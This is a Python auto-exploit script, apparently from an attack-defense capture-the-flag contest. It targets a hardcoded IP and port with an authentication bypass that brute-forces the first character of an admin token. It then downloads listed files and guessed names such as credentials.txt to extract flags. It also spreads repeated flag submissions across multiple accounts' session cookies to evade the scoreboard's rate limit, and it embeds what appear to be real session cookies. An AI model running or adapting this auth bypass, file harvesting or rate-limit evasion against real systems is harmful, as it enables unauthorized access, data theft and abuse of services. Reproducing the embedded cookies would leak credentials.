#!/usr/bin/env python3
import requests
import re
import time
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import random
import socket

# --------------------------------------------------------------------------------
# CONFIG
# --------------------------------------------------------------------------------
TARGET_HOST = "35.197.152.52"
TARGET_PORT = 1337
SUBMIT_URL = "https://ad.cscv.vn/submitflag_API"

# --------------------------------------------------------------------------------
# MULTIPLE AGENTS - THÊM COOKIES CỦA CÁC ACCOUNTS KHÁC Ở ĐÂY!
# --------------------------------------------------------------------------------
AGENTS = [
    {
        'name': 'Agent-3',
        'cookies': {
            "x_polaris_sid": "C1ThICdO5t1vzkJrcPpW8Hk5RbKU9EoF6Ld1",
            "x_polaris_cid": "C1RwzpVUNcQnW6DOSG|mffk9rDpd|pucMLJ9",
            "session": "d9359e62-7a45-429a-bc1c-1eaec050aef5.viWA_4emUB3vPXq11-l3Gbkf27A",
            "x_polaris_sd": "LZfLlYdxbxzSuuYj1szATUYc/0GKi|O|ILp8hdw1QLCqsCAq9q/RfGBJdND/HM2n5hMvMckQB3g9tGs4uMRvmKRXZgpjKoOneJ/IbbYeHEicVdjrskEHBP83WS1cwCEXop7!"
        }
    },
]

TEAM = "MTA.ADC"
DAEMON = "TOD"  # <-- ĐÃ THAY ĐỔI - Service TOD

# MULTI-AGENT CONFIG
CHECK_INTERVAL = 1
SUBMITS_PER_FLAG = 10       # Số lần submit cho mỗi flag
AGENT_COOLDOWN = 5          # Cooldown khi agent bị rate limit
SUBMIT_TIMEOUT = 2
EXPLOIT_TIMEOUT = 10        # Timeout cho socket exploit

# --------------------------------------------------------------------------------
# EXPLOIT SETUP
# --------------------------------------------------------------------------------
submitted_flags = set()

# Track agent states
agent_states = {}
for agent in AGENTS:
    agent_states[agent['name']] = {
        'rate_limited_until': 0,
        'total_submits': 0,
        'successful_submits': 0,
        'rate_limits': 0
    }

# --------------------------------------------------------------------------------
# SOCKET HELPER FUNCTIONS
# --------------------------------------------------------------------------------
def send(sock, data):
    """Gửi data qua socket"""
    if isinstance(data, str):
        data = data.encode()
    sock.sendall(data + b'\n')
    time.sleep(0.05)

def recv(sock, timeout=2):
    """Nhận data từ socket"""
    sock.settimeout(timeout)
    try:
        data = sock.recv(8192)
        return data.decode('utf-8', errors='ignore')
    except:
        return ""

# --------------------------------------------------------------------------------
# EXPLOIT FUNCTION - TOD SERVICE
# --------------------------------------------------------------------------------
def get_flag_fast():
    """
    Exploit cho TOD service - Auth bypass + File download
    Bruteforce token admin và download files
    """
    # Các ký tự hex thường gặp
    hex_chars = '0123456789abcdef'
    
    try:
        # Thử bruteforce ký tự đầu của admin token
        for char in hex_chars:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(EXPLOIT_TIMEOUT)
            
            try:
                sock.connect((TARGET_HOST, TARGET_PORT))
                
                # Auth với admin
                send(sock, f'AUTH admin {char}')
                response = recv(sock, timeout=1)
                
                if 'OK' in response or 'Welcome' in response:
                    # Authenticated thành công!
                    
                    # List files
                    send(sock, 'LIST')
                    files_response = recv(sock, timeout=2)
                    
                    # Parse filenames
                    filenames = []
                    for line in files_response.split('\n'):
                        line = line.strip()
                        if line and line != 'HIDDEN' and not line.startswith('ERR'):
                            filenames.append(line)
                    
                    # Download mỗi file và tìm flag
                    for filename in filenames:
                        send(sock, f'DOWNLOAD {filename}')
                        content = recv(sock, timeout=2)
                        
                        # Tìm flag pattern: CSCV2025{...}
                        flag_match = re.search(r'CSCV2025\{[A-Za-z0-9_]+\}', content)
                        if flag_match:
                            sock.close()
                            return flag_match.group(0)
                    
                    # Thử các tên file phổ biến
                    common_files = [
                        'flag', 'flag.txt', 'FLAG', 'FLAG.txt',
                        'secret', 'secret.txt', 'key.txt',
                        'admin.txt', 'credentials.txt'
                    ]
                    
                    for filename in common_files:
                        if filename not in filenames:
                            send(sock, f'DOWNLOAD {filename}')
                            content = recv(sock, timeout=1)
                            
                            if content and 'ERR' not in content:
                                flag_match = re.search(r'CSCV2025\{[A-Za-z0-9_]+\}', content)
                                if flag_match:
                                    sock.close()
                                    return flag_match.group(0)
                    
                    sock.close()
                    break  # Đã auth được admin nhưng không tìm thấy flag
                
                sock.close()
                
            except socket.timeout:
                sock.close()
                continue
            except Exception:
                sock.close()
                continue
    
    except Exception:
        pass
    
    return None

# --------------------------------------------------------------------------------
# SUBMIT LOGIC (Giữ nguyên từ template)
# --------------------------------------------------------------------------------

def get_available_agent():
    """Lấy agent khả dụng (không bị rate limit)"""
    now = time.time()
    available = [
        agent for agent in AGENTS 
        if agent_states[agent['name']]['rate_limited_until'] < now
    ]
    
    if not available:
        # Tất cả bị rate limit, chọn agent sắp hết cooldown
        return min(AGENTS, key=lambda a: agent_states[a['name']]['rate_limited_until'])
    
    # Random để phân tải đều
    return random.choice(available)

def submit_with_agent(flag, agent, req_id):
    """Submit với 1 agent cụ thể"""
    agent_name = agent['name']
    state = agent_states[agent_name]
    
    # Check if still in cooldown
    if time.time() < state['rate_limited_until']:
        return {
            'id': req_id,
            'agent': agent_name,
            'success': False,
            'alert': 'Agent in cooldown',
            'rate_limited': True
        }
    
    try:
        r = requests.post(
            SUBMIT_URL,
            data={"team": TEAM, "daemon": DAEMON, "action": "submit-flag", "flag": flag},
            cookies=agent['cookies'],
            headers={"Origin": "https://ad.cscv.vn", "Referer": "https://ad.cscv.vn/final"},
            allow_redirects=False,
            timeout=SUBMIT_TIMEOUT
        )

        state['total_submits'] += 1
        
        alert_match = re.search(r'alert\(["\']([^"\']+)["\']\)', r.text)
        alert = alert_match.group(1) if alert_match else "No response"
        
        success = r.status_code in [200, 302]
        
        # Check rate limit
        rate_limited = False
        if 'rate limit' in alert.lower():
            rate_limited = True
            state['rate_limits'] += 1
            state['rate_limited_until'] = time.time() + AGENT_COOLDOWN
        elif success and 'already' not in alert.lower():
            state['successful_submits'] += 1

        return {
            'id': req_id,
            'agent': agent_name,
            'success': success,
            'alert': alert,
            'rate_limited': rate_limited
        }
        
    except Exception as e:
        return {
            'id': req_id,
            'agent': agent_name,
            'success': False,
            'alert': f"Error: {str(e)}",
            'rate_limited': False
        }

def multi_agent_submit(flag, num_submits=10):
    """
    Submit với multiple agents parallel
    Mỗi agent có rate limit RIÊNG!
    """
    print(f"      ├─ Multi-agent submit ({num_submits}x across {len(AGENTS)} agents)...")
    
    results = []
    
    with ThreadPoolExecutor(max_workers=num_submits) as executor:
        futures = []
        
        for i in range(num_submits):
            # Chọn agent khả dụng cho mỗi request
            agent = get_available_agent()
            future = executor.submit(submit_with_agent, flag, agent, i+1)
            futures.append(future)
        
        # Collect results
        for future in as_completed(futures):
            results.append(future.result())
    
    # Sort by ID
    results.sort(key=lambda x: x['id'])
    
    # Analysis
    by_agent = {}
    accepted_count = 0
    rate_limited_count = 0
    
    for r in results:
        agent_name = r['agent']
        if agent_name not in by_agent:
            by_agent[agent_name] = []
        by_agent[agent_name].append(r)
        
        if r['rate_limited']:
            rate_limited_count += 1
        elif r['success'] and 'already' not in r.get('alert', '').lower():
            accepted_count += 1
    
    # Print summary
    success = sum(1 for r in results if r['success'])
    print(f"      │   └─ {success}/{num_submits} OK", end="")
    
    if accepted_count > 0:
        print(f" | {accepted_count} ACCEPTED ✅", end="")
    if rate_limited_count > 0:
        print(f" | {rate_limited_count} rate limited ⚠️", end="")
    print()
    
    # Print by agent
    print(f"      │")
    for agent_name, agent_results in by_agent.items():
        agent_success = sum(1 for r in agent_results if r['success'])
        agent_rate_limited = sum(1 for r in agent_results if r.get('rate_limited'))
        alerts = {}
        for r in agent_results:
            alert = r.get('alert', 'Unknown')
            alerts[alert] = alerts.get(alert, 0) + 1
        
        print(f"      │   [{agent_name}] {agent_success}/{len(agent_results)} OK", end="")
        if agent_rate_limited > 0:
            print(f" ({agent_rate_limited} rate limited)", end="")
        print()
        
        # Top alert
        if alerts:
            top_alert = max(alerts.items(), key=lambda x: x[1])
            print(f"      │    └─ [{top_alert[1]}x] {top_alert[0]}")
    
    return accepted_count > 0

def print_agent_status():
    """In trạng thái các agents"""
    print(f"      │")
    print(f"      │   Agent Status:")
    now = time.time()
    for agent in AGENTS:
        state = agent_states[agent['name']]
        status = "✅ Ready"
        if state['rate_limited_until'] > now:
            cooldown = int(state['rate_limited_until'] - now)
            status = f"⏸ Cooldown ({cooldown}s)"
        
        print(f"      │   ├─ {agent['name']}: {status} | "
              f"Submits: {state['total_submits']} | "
              f"Accepted: {state['successful_submits']} | "
              f"Rate limits: {state['rate_limits']}")

# --------------------------------------------------------------------------------
# MAIN LOOP
# --------------------------------------------------------------------------------
def main():
    print("=" * 80)
    print(f"[*] MULTI-AGENT Auto Exploit - Team: {TEAM} | Daemon: {DAEMON}")
    print(f"[*] Target: {TARGET_HOST}:{TARGET_PORT}")
    print(f"[*] Exploit: TOD Service - Auth Bypass + File Download")
    print(f"[*] Agents: {len(AGENTS)} configured")
    print(f"[*] Strategy: {SUBMITS_PER_FLAG}x submits per flag using multiple agents")
    print(f"[*] Feature: BYPASS RATE LIMIT - each agent has separate rate limit!")
    print("=" * 80)
    
    if len(AGENTS) == 1:
        print("[!] WARNING: Only 1 agent configured!")
        print("[!] Add more agents in AGENTS list to bypass rate limit effectively")
        print("=" * 80)
    
    checks = 0
    new_flags = 0
    accepted = 0
    last_flag = None
    consecutive_same = 0
    
    try:
        while True:
            checks += 1
            ts = datetime.now().strftime("%H:%M:%S")
            
            print(f"[{ts}] #{checks:3d} ", end="", flush=True)
            
            flag = get_flag_fast()
            
            if not flag:
                print("✗")
                time.sleep(CHECK_INTERVAL)
                continue
            
            if flag == last_flag:
                consecutive_same += 1
                print(f"⊗ (x{consecutive_same})")
                time.sleep(CHECK_INTERVAL)
                continue
            
            # NEW FLAG!
            consecutive_same = 0
            last_flag = flag
            
            print(f"\n   [⚡] NEW: {flag}")
            
            if flag in submitted_flags:
                print(f"      └─ Skip: already submitted before")
                time.sleep(CHECK_INTERVAL)
                continue
            
            # MULTI-AGENT SUBMIT
            is_accepted = multi_agent_submit(flag, SUBMITS_PER_FLAG)
            
            submitted_flags.add(flag)
            new_flags += 1
            if is_accepted:
                accepted += 1
            
            # Print agent status
            print_agent_status()
            
            print(f"      └─ Stats: {accepted} accepted | {new_flags} new | {len(submitted_flags)} unique")
            
            time.sleep(CHECK_INTERVAL)
            
    except KeyboardInterrupt:
        print("\n" + "=" * 80)
        print(f"[!] Summary:")
        print(f"    ├─ Checks: {checks}")
        print(f"    ├─ New Flags: {new_flags}")
        print(f"    ├─ Accepted: {accepted}")
        
        rate = f"{accepted/new_flags*100:.1f}%" if new_flags > 0 else "N/A"
        print(f"    ├─ Success Rate: {rate}")
        print(f"    │")
        print(f"    └─ Agent Performance:")
        for agent in AGENTS:
            state = agent_states[agent['name']]
            print(f"       ├─ {agent['name']}: "
                  f"{state['successful_submits']}/{state['total_submits']} accepted | "
                  f"{state['rate_limits']} rate limits")
        print("=" * 80)

if __name__ == "__main__":
    main()